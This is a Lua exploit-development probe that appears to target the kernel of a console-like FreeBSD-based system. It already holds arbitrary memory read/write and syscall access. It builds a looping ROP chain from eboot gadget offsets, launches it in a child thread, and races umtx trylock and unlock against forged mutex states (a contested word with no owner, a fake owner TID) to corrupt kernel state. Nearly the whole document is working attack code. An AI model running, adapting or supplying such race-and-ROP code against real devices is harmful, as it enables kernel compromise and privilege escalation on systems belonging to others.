-- CRASH_CLASS: MODERATE
-- PROBE 127l: UMTX race with TRYLOCK (non-blocking)
--
-- 127k deadlocked: MUTEX_LOCK blocked when child wrote main_tid|CONTESTED.
-- Fix: use MUTEX_TRYLOCK (op 4) which returns immediately.
-- Child writes: 0x80000000 (contested no-owner), 0xDEAD (fake TID), 0 (clear).
-- No main_tid in race values to avoid self-deadlock.
--
-- The race target: kernel's CAS during trylock/unlock sees impossible states
-- that trigger PI chain walks on non-existent threads or empty turnstiles.

print("=== PROBE 127l: UMTX RACE (TRYLOCK) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Gadgets
local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    mov_w   = 0x92C67,
}

-- Allocations
local shared   = memory.alloc(0x2000)
local stk_buf  = memory.alloc(0x4000)
local ctx_buf  = memory.alloc(0x500)
local tid_buf  = memory.alloc(8)

local S   = N(shared)
local STK = N(stk_buf)
local BC  = N(ctx_buf)

local MTX = S
local SENTINEL = S + 8
local RESULTS = S + 0x100

for off = 0, 0x1F8, 8 do wq(S + off, uint64("0x0")) end
wq(N(tid_buf), uint64("0x0"))

-- [A] Verify TRYLOCK works standalone
print("")
print("[A] TRYLOCK sanity check")
local sc_umtx = mk(454)

-- Trylock on empty mutex → should succeed (ret=0), write TID
local tr1 = nil
pcall(function()
    tr1 = sc_umtx(shared, uint64(4), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local mtx1 = rd(MTX) or 0
if mtx1 < 0 then mtx1 = mtx1 + 0x100000000 end
print(string.format("  trylock(empty): ret=%s word=0x%08X", fmt(tr1), mtx1))

-- Unlock
pcall(function()
    sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
end)

-- Trylock on contested mutex (write 0x80000000 first)
wd(MTX, 0x80000000)  -- contested, no owner
wd(MTX + 4, 0)
local tr2 = nil
pcall(function()
    tr2 = sc_umtx(shared, uint64(4), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local mtx2 = rd(MTX) or 0
if mtx2 < 0 then mtx2 = mtx2 + 0x100000000 end
print(string.format("  trylock(0x80000000): ret=%s word=0x%08X", fmt(tr2), mtx2))

-- Trylock on fake-TID mutex
wd(MTX, 0xDEAD)  -- fake owner
wd(MTX + 4, 0)
local tr3 = nil
pcall(function()
    tr3 = sc_umtx(shared, uint64(4), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local mtx3 = rd(MTX) or 0
if mtx3 < 0 then mtx3 = mtx3 + 0x100000000 end
print(string.format("  trylock(0xDEAD): ret=%s word=0x%08X", fmt(tr3), mtx3))

-- Reset
wd(MTX, 0)
wd(MTX + 4, 0)

if not alive() then print("DIED in sanity check!") return end

-- [B] Build child ROP chain — writes race values in tight loop
print("")
print("[B] Child ROP chain")

local CB = STK + 0x3000

-- Child writes three values in rotation to mutex word:
-- 1. 0x80000000 (CONTESTED, no owner) → kernel slow path, empty turnstile
-- 2. 0xDEAD (fake TID) → kernel PI lookup on non-existent thread
-- 3. 0 (unlocked) → clear state, race with CAS

-- Write 0x80000000
wq(CB + 0x00, eaddr(G.pop_rdi))
wq(CB + 0x08, shared)
wq(CB + 0x10, eaddr(G.pop_rax))
wq(CB + 0x18, uint64("0x80000000"))
wq(CB + 0x20, eaddr(G.mov_w))

-- Write 0xDEAD
wq(CB + 0x28, eaddr(G.pop_rdi))
wq(CB + 0x30, shared)
wq(CB + 0x38, eaddr(G.pop_rax))
wq(CB + 0x40, uint64("0xDEAD"))
wq(CB + 0x48, eaddr(G.mov_w))

-- Write 0
wq(CB + 0x50, eaddr(G.pop_rdi))
wq(CB + 0x58, shared)
wq(CB + 0x60, eaddr(G.pop_rax))
wq(CB + 0x68, uint64("0x0"))
wq(CB + 0x70, eaddr(G.mov_w))

-- Write sentinel
wq(CB + 0x78, eaddr(G.pop_rdi))
wq(CB + 0x80, uint64(string.format("0x%X", SENTINEL)))
wq(CB + 0x88, eaddr(G.pop_rax))
wq(CB + 0x90, uint64("0x4141414142424242"))
wq(CB + 0x98, eaddr(G.mov_w))

-- Loop
wq(CB + 0xA0, eaddr(G.pop_rsp))
wq(CB + 0xA8, uint64(string.format("0x%X", CB)))

print(string.format("  chain at 0x%X, rotating: 0x80000000 / 0xDEAD / 0x0", CB))

if not alive() then print("DIED!") return end

-- [C] Launch child
print("")
print("[C] Launch child")

for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0)
wd(BC + 0x110, 0x10000)
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

wq(N(tid_buf), uint64("0x0"))
local thr_ret = nil
pcall(function()
    thr_ret = mk(430)(ctx_buf, tid_buf, uint64(0))
end)
local child_tid = rq(N(tid_buf))
print(string.format("  ret=%s tid=%s", fmt(thr_ret), fmt(child_tid)))

if thr_ret == nil or N(thr_ret) ~= 0 then
    print("  THREAD CREATION FAILED!") return
end

for i = 1, 100 do native.fcall_with_rax(stub, 20) end
local sent = rq(SENTINEL)
print(string.format("  sentinel=%s %s", fmt(sent),
    (sent and N(sent) ~= 0) and "CHILD RUNNING" or "NOT YET"))

if not alive() then print("DIED!") return end

-- [D] RACE: TRYLOCK + UNLOCK, 2000 fast iterations
print("")
print("[D] UMTX race (2000 trylock/unlock)")

local trylock_ok = 0
local trylock_busy = 0
local trylock_crash = 0
local unlock_ok = 0
local unlock_fail = 0
local unlock_crash = 0
local weird_trylock = 0
local weird_unlock = 0
local snapshots = {}
local ITERATIONS = 2000

for iter = 1, ITERATIONS do
    -- TRYLOCK (op 4) — never blocks
    local tr = nil
    local tok = pcall(function()
        tr = sc_umtx(shared, uint64(4), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not tok then
        trylock_crash = trylock_crash + 1
    else
        local rv = tr and N(tr) or -999
        if rv == 0 then
            trylock_ok = trylock_ok + 1
        elseif rv == -1 or rv == 0xFFFFFFFFFFFFFFFF then
            trylock_busy = trylock_busy + 1
        else
            weird_trylock = weird_trylock + 1
            if #snapshots < 10 then
                local mtx_snap = rd(MTX) or 0
                if mtx_snap < 0 then mtx_snap = mtx_snap + 0x100000000 end
                snapshots[#snapshots + 1] = string.format(
                    "iter=%d trylock_ret=%s word=0x%08X", iter, fmt(tr), mtx_snap)
            end
        end
    end

    -- UNLOCK (op 6) — always attempt, even if trylock failed
    local ur = nil
    local uok = pcall(function()
        ur = sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not uok then
        unlock_crash = unlock_crash + 1
    else
        local uv = ur and N(ur) or -999
        if uv == 0 then
            unlock_ok = unlock_ok + 1
        elseif uv == -1 or uv == 0xFFFFFFFFFFFFFFFF then
            unlock_fail = unlock_fail + 1
        else
            weird_unlock = weird_unlock + 1
        end
    end

    if not alive() then
        print(string.format("  *** DIED at iter %d ***", iter))
        break
    end

    if iter % 500 == 0 then
        local snap = rd(MTX) or 0
        if snap < 0 then snap = snap + 0x100000000 end
        print(string.format("  i=%d TL(ok=%d busy=%d crash=%d weird=%d) UL(ok=%d fail=%d crash=%d weird=%d) word=0x%08X",
            iter, trylock_ok, trylock_busy, trylock_crash, weird_trylock,
            unlock_ok, unlock_fail, unlock_crash, weird_unlock, snap))
    end
end

-- [E] Results
print("")
print("[E] Results")
print(string.format("  iterations: %d", ITERATIONS))
print(string.format("  trylock: ok=%d busy=%d crash=%d weird=%d",
    trylock_ok, trylock_busy, trylock_crash, weird_trylock))
print(string.format("  unlock:  ok=%d fail=%d crash=%d weird=%d",
    unlock_ok, unlock_fail, unlock_crash, weird_unlock))

if #snapshots > 0 then
    print("  weird snapshots:")
    for _, s in ipairs(snapshots) do
        print("    " .. s)
    end
end

local final_mtx = rd(MTX) or 0
if final_mtx < 0 then final_mtx = final_mtx + 0x100000000 end
print(string.format("  final word: 0x%08X", final_mtx))

local final_sent = rq(SENTINEL)
print(string.format("  sentinel: %s", fmt(final_sent)))

-- [F] Now try MUTEX_LOCK (op 5) with the word pre-set to 0
-- If the race corrupted kernel state, this might crash or behave oddly
print("")
print("[F] Post-race MUTEX_LOCK sanity check")
wd(MTX, 0)
wd(MTX + 4, 0)
local post_lr = nil
pcall(function()
    post_lr = sc_umtx(shared, uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local post_mtx = rd(MTX) or 0
if post_mtx < 0 then post_mtx = post_mtx + 0x100000000 end
print(string.format("  lock ret=%s word=0x%08X", fmt(post_lr), post_mtx))

pcall(function()
    sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
end)

if trylock_crash > 0 or unlock_crash > 0 then
    print("")
    print("*** PCALL CRASHES DETECTED — KERNEL STATE MAY BE CORRUPT ***")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127l COMPLETE ===")
